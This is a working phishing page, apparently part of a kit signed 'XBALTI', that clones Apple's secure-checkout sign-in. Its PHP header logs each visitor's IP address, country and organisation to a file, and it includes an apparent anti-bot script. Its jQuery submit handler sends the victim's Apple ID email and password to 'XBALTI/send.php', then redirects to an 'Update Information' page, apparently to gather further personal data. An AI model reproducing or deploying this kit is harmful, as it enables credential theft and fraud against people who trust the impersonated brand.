<?php
session_start();
include 'anti.php';
date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');
$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['country'] = $country   = $details->country;
$_SESSION['org'] = $org   = $details->org;
$file = fopen("LOGS.txt","a");
fwrite($file,"|ip| ===>> ".$_SESSION['_ip_']." <@> |country| ===>> ".$_SESSION['country']." <@> |Time/Date| ===>> ".$timedate." <@> |ORG| ===>> ".$_SESSION['org']."\n");
?>
             <!-- ,;;;;;;;, -->
            <!-- ;;;;;;;;;;;, -->
           <!-- ;;;;;'_____;' -->
           <!-- ;;;(/))))|((\ -->
           <!-- _;;((((((|)))) -->
          <!-- / |_\\\\\\\\\\\\ -->
     <!-- .--~(  \ ~)))))))))))) -->
    <!-- /     \  `\-(((((((((((\\ -->
    <!-- |    | `\   ) |\       /|) -->
     <!-- |    |  `. _/  \_____/ | -->
      <!-- |    , `\~            / -->
       <!-- |    \  \ BY XBALTI / -->
      <!-- | `.   `\|          / -->
      <!-- |   ~-   `\        / -->
       <!-- \____~._/~ -_,   (\ -->
        <!-- |-----|\   \    ';; -->
       <!-- |      | :;;;'     \ -->
      <!-- |  /    |            | -->
      <!-- |       |            |    -->
<!doctype html>
<html>

<head>

    <title>Sign In — Secure Checkout - Apple</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

    <link rel="stylesheet" href="./css/style.css" media="screen, print">

    <link rel="stylesheet" href="./css/style2.css" media="screen, print">

    <link rel="stylesheet" href="./css/fonts.css" media="screen, print">

    <style>
        #loading {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: rgba(241, 241, 241, 0.75);
            z-index: 99;
            text-align: center;
        }
        
        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>

    <script src="./js/header.js"></script>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>

    <meta name="robots" content="noindex, nofollow">

</head>

<body>
    <div style="display: none;" id="loading">
        <img id="loading-image" src="./img/loadingvbv.gif" />
    </div>
    <div id="frima" class="metrics">

    </div>

    <div id="page">

        <meta name="ac-gn-store-key" content="SKCXTKATUYT9JK4HD">
        <meta name="ac-gn-segmentbar-redirect" content="true">

        <aside dir="ltr" lang="en-US" class="ac-gn-segmentbar" id="ac-gn-segmentbar">
        </aside>
        <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
        <nav dir="ltr" id="ac-globalnav" class="js no-touch" role="navigation">
            <div class="ac-gn-content">
                <ul class="ac-gn-header">
                    <li class="ac-gn-item ac-gn-menuicon">
                        <label class="ac-gn-menuicon-label" for="ac-gn-menustate">
                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                            </span>
                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                            </span>
                        </label>
                        <a href="#ac-gn-menustate" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
                            <span class="ac-gn-menuanchor-label">Global Nav Open Menu</span>
                        </a>
                        <a href="#" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
                            <span class="ac-gn-menuanchor-label">Global Nav Close Menu</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-apple">
                        <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus-small">
                            <span class="ac-gn-link-text">Apple</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                        <a href="#" class="ac-gn-link ac-gn-link-bag">
                            <span class="ac-gn-link-text">Shopping Bag</span>
                            <span class="ac-gn-bag-badge"></span>
                        </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <div class="ac-gn-search-placeholder-container" role="search">
                    <div class="ac-gn-search ac-gn-search-small">
                        <a id="ac-gn-link-search-small" class="ac-gn-link" href="#" role="button">
                            <div class="ac-gn-search-placeholder-bar">
                                <div class="ac-gn-search-placeholder-input">
                                    <div class="ac-gn-search-placeholder-input-text">
                                        <div class="ac-gn-link-search ac-gn-search-placeholder-input-icon"></div>
                                        <span class="ac-gn-search-placeholder"></span>
                                    </div>
                                </div>
                                <div class="ac-gn-searchview-close ac-gn-searchview-close-small ac-gn-search-placeholder-searchview-close">
                                    <span class="ac-gn-searchview-close-cancel">Cancel</span>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <ul class="ac-gn-list">
                    <li class="ac-gn-item ac-gn-apple">
                        <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus">
                            <span class="ac-gn-link-text">Apple</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
                        <a href="#" class="ac-gn-link ac-gn-link-mac">
                            <span class="ac-gn-link-text">Mac</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
                        <a href="#" class="ac-gn-link ac-gn-link-ipad">
                            <span class="ac-gn-link-text">iPad</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
                        <a href="#" class="ac-gn-link ac-gn-link-iphone">
                            <span class="ac-gn-link-text">iPhone</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
                        <a href="#" class="ac-gn-link ac-gn-link-watch">
                            <span class="ac-gn-link-text">Watch</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
                        <a href="#" class="ac-gn-link ac-gn-link-tv">
                            <span class="ac-gn-link-text">TV</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
                        <a href="#" class="ac-gn-link ac-gn-link-music">
                            <span class="ac-gn-link-text">Music</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
                        <a href="#" class="ac-gn-link ac-gn-link-support">
                            <span class="ac-gn-link-text">Support</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                        <a href="#" class="ac-gn-link ac-gn-link-search" id="ac-gn-link-search" role="button"></a>
                    </li>
                    <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                        <a href="#" class="ac-gn-link ac-gn-link-bag">
                            <span class="ac-gn-link-text">Shopping Bag</span>
                            <span class="ac-gn-bag-badge"></span>
                        </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <aside role="search" class="ac-gn-searchview" id="ac-gn-searchview">
                    <div class="ac-gn-searchview-content">
                        <div class="ac-gn-searchview-bar">
                            <div class="ac-gn-searchview-bar-wrapper">
                                <form method="get" action="#" class="ac-gn-searchform" id="ac-gn-searchform">
                                    <div class="ac-gn-searchform-wrapper">
                                        <input spellcheck="false" autocomplete="off" placeholder="Search apple.com" id="ac-gn-searchform-input" role="combobox" class="ac-gn-searchform-input" type="text">
                                        <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
                                        <button class="ac-gn-searchform-submit" type="submit" id="ac-gn-searchform-submit"></button>
                                        <button class="ac-gn-searchform-reset" type="reset" id="ac-gn-searchform-reset">
                                            <span class="ac-gn-searchform-reset-background"></span>
                                        </button>
                                    </div>
                                </form>
                                <button id="ac-gn-searchview-close-small" class="ac-gn-searchview-close ac-gn-searchview-close-small">
                                    <span class="ac-gn-searchview-close-cancel">
									Cancel
								</span>
                                </button>
                            </div>
                        </div>
                        <aside class="ac-gn-searchresults" id="ac-gn-searchresults">
                            <section class="ac-gn-searchresults-section ac-gn-searchresults-section-defaultlinks">
                                <div class="ac-gn-searchresults-section-wrapper">
                                    <h3 class="ac-gn-searchresults-header ac-gn-searchresults-animated">Quick Links</h3>
                                    <ul class="ac-gn-searchresults-list" id="defaultlinks" role="listbox">
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Find a Store</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Today at Apple</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Accessories</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">AirPods</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">iPod</a>
                                        </li>
                                    </ul>
                                    <span role="status" class="ac-gn-searchresults-count">5 Quick Links</span>
                                </div>
                            </section>

                        </aside>
                    </div>
                    <button class="ac-gn-searchview-close" id="ac-gn-searchview-close">
                        <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span>
                        <span class="ac-gn-searchview-close-right"></span>
                        </span>
                    </button>
                </aside>
                <aside class="ac-gn-bagview">
                    <div class="ac-gn-bagview-scrim">
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
                    </div>
                    <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
                    </div>
                </aside>
            </div>
        </nav>
        <div class="ac-gn-blur"></div>
        <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
        <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>

        <div id="signin-container" class="rs-page-content">

            <div>
                <div id="rr-viewport"></div>
                <div role="main">
                    <div class="rs-signin">
                        <h1 class="as-l-container rs-signin-header">Sign in.</h1>
                        <div class="row as-l-container">
                            <div class="rs-signin-returningcustomer">
                                <div class="column large-5 small-12 as-signin-returningcustomer">
                                    <form action="" name="loginform" id="loginform" method="post">
                                        <fieldset>
                                            <div class="as-signin-input">
                                                <div class="1E form-element">
                                                    <input value="" type="email" name="email" id="email" class="form-textbox form-textbox-text" required="" maxlength="120"><span class="form-label"><span id="loginHome.customerLogin.appleId-label">Apple ID</span></span>
                                                    <div>
                                                        <div id="loginHome.customerLogin.appleId-error" class="form-message-wrapper">Apple ID is missing.</div>
                                                        <div id="loginHome.customerLogin.appleId-warn" class="form-message-warning"></div>
                                                    </div>
                                                </div>
                                                <div class="1P form-element">
                                                    <input value="" type="password" id="password" name="password" class="form-textbox form-textbox-text" required="" maxlength="32"><span class="form-label"><span id="loginHome.customerLogin.password-label">Password</span></span>
                                                    <div>
                                                        <div id="loginHome.customerLogin.password-error" class="form-message-wrapper">Password is missing.</div>
                                                        <div id="loginHome.customerLogin.password-warn" class="form-message-warning"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </fieldset>
                                        <p class="as-signin-info" id="signin-info-id">Your Apple ID is the email address you use to sign in to iTunes, the App Store, and iCloud.</p>
                                        <div class="as-signin-button">
                                            <button type="submit" class="button button-block form-button"><span aria-hidden="true">Sign In</span><span class="visuallyhidden">Sign In</span></button>
                                        </div>
                                    </form>
                                    <div class="as-signin-forgotpassword"><a href="#"><span >Forgot your Apple ID or password?</span><span class="visuallyhidden">Forgot your Apple ID or password? (Opens in a new window)</span></a></div>
                                    <div class="as-signin-accountcreation"><a data-prop37="AOS: Checkout Sign In | Checkout | CreateAccount" href="#" class="as-buttonlink"><span >Don't have an Apple ID? Create one now.</span><span class="visuallyhidden">Don't have an Apple ID? Create one now. (Opens in a new window)</span></a></div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="as-chat rs-chat">
                        <div class="as-l-container rs-chat-content">

                            <div>Need more help?
                                <button class="as-chat-button as-buttonlink">Chat now</button> or call 1‑800‑MY‑APPLE.</div>

                        </div>
                    </div>
                    <div class="as-footnotes">
                        <div class="as-footnotes-content">
                            <div class="as-footnotes-sosumi">
                                <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <footer class="as-globalfooter as-globalfooter-simple as-globalfooter-contained js flexbox">
            <div class="as-globalfooter-content">
                <div class="as-globalfooter-mini">

                    <div class="as-globalfooter-mini-shop">

                        <p>More ways to shop: <span class="nowrap">Visit an <a href="#" >Apple Store</a></span>, <span class="nowrap">call 1‑800‑MY‑APPLE, or <a href="#"  >find a reseller</a></span>.</p>

                    </div>

                    <div class="as-globalfooter-mini-locale">

                        <a class="as-globalfooter-mini-locale-link" href="#">
                             <?php echo $_SESSION['country']; ?>
                        </a>

                    </div>

                    <div class="as-globalfooter-mini-legal">
                        <p class="as-globalfooter-mini-legal-copyright">
                            Copyright © 2019 Apple Inc. All rights reserved.
                        </p>
                        <p class="as-globalfooter-mini-legal-links">

                            <a class="as-globalfooter-mini-legal-link" href="#">Privacy Policy</a>

                            <a class="as-globalfooter-mini-legal-link" href="#l">Terms of Use</a>

                            <a class="as-globalfooter-mini-legal-link" href="#">Sales and Refunds</a>

                            <a class="as-globalfooter-mini-legal-link" href="#">
			        Site Map
			    </a>
                        </p>
                    </div>

                </div>

            </div>
        </footer>

        <div class="overlay" tabindex="-1"><span class="chrome tl"></span><span class="chrome tr"></span><span class="chrome top"></span><span class="chrome left"></span><span class="chrome right"></span><span class="chrome bottom"></span><span class="chrome bl"></span><span class="chrome br"></span><span class="chrome center"></span>
            <div class="container">
                <div class="content" id="overlayContent"></div>
                <ul class="buttons recoveryOptions">
                    <li>
                        <button></button>
                    </li>
                </ul>
            </div>
            <button class="close"></button>
        </div>

    </div>

    <div id="ac-gn-viewport-emitter">&nbsp;</div>
	
	<script>
	$(function() {

  $("form[name='loginform']").validate({
    rules: {
       email : "required",
       password: {
      required: true,
      minlength: 4
    }
    },
	      highlight: function(element) {
                        $(element).parents( ".1E" ).addClass("is-error ");
						$(element).parents( ".1P" ).addClass("is-error ");
                    },
         unhighlight: function(element) {
                        $(element).parents( ".1E" ).removeClass("is-error ");
						$(element).parents( ".1P" ).removeClass("is-error ");
                    },
       messages: {
       email : "",
       password : "",
    },

     submitHandler: function(form) {
            $("#loading").show();
                 $.post("XBALTI/send.php", $("#loginform").serialize(), function(result) {
                          setTimeout(function() {
                              $("#loading").hide(500);
                                $(location).attr("href", "Account?Update=Information");
                        },2000);
            });
        },
  
    });

});


			$(document).ready(function(){
    $('#email').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#email").removeClass("form-textbox-entered");	
		} 
        else {
		$("#email").addClass("form-textbox-entered"); 
			}});
    });
	
	
	
				$(document).ready(function(){
    $('#password').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#password").removeClass("form-textbox-entered");	
		} 
        else {
		$("#password").addClass("form-textbox-entered"); 
			}});
    });
	
	</script>
</body>

</html>